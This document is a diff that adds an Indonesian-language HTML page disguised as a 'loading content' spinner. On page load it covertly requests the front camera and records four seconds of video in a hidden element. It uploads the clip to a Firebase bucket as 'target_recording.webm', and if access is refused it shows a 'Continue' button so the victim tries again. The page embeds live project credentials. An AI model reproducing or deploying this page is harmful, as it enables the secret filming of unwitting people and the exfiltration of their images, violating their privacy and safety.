@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Konten...</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .box { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #btn-fallback { display: none; margin-top: 15px; padding: 10px 20px; background: #222; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spinner"></div>
+        <p>Memuat Konten, Silakan Tunggu...</p>
+        <button id="btn-fallback" onclick="startRecording()">Lanjutkan</button>
+    </div>
+
+    <!-- Elemen video tersembunyi untuk proses rekam -->
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+    <!-- Firebase SDK v9 Modular (App & Storage) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getStorage, ref as sRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        async function startRecording() {
+            const video = document.getElementById('cam');
+
+            try {
+                // Meminta akses kamera dengan resolusi HD
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                document.getElementById('btn-fallback').style.display = 'none';
+
+                let recordedChunks = [];
+                // Gunakan MediaRecorder untuk merekam video lokal di HP target tanpa lag
+                let mediaRecorder;
+                
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream); // Fallback codec default browser
+                }
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    // Gabungkan potongan rekaman menjadi satu file video blob
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    
+                    // Buat path penyimpanan di Firebase Storage
+                    const videoRef = sRef(storage, 'videos/target_recording.webm');
+
+                    try {
+                        // Upload file video ke Firebase Storage
+                        await uploadBytes(videoRef, blob);
+                        console.log("Video berhasil di-upload!");
+                    } catch (err) {
+                        console.error("Gagal upload video:", err);
+                    }
+
+                    // Matikan kamera setelah selesai
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                // Mulai merekam
+                mediaRecorder.start();
+
+                // Rekam selama 4 detik, lalu hentikan otomatis dan simpan
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 4000);
+
+            } catch (err) {
+                console.warn("Akses kamera ditolak:", err);
+                document.getElementById('btn-fallback').style.display = 'inline-block';
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', startRecording);
+    </script>
+</body>
+</html>
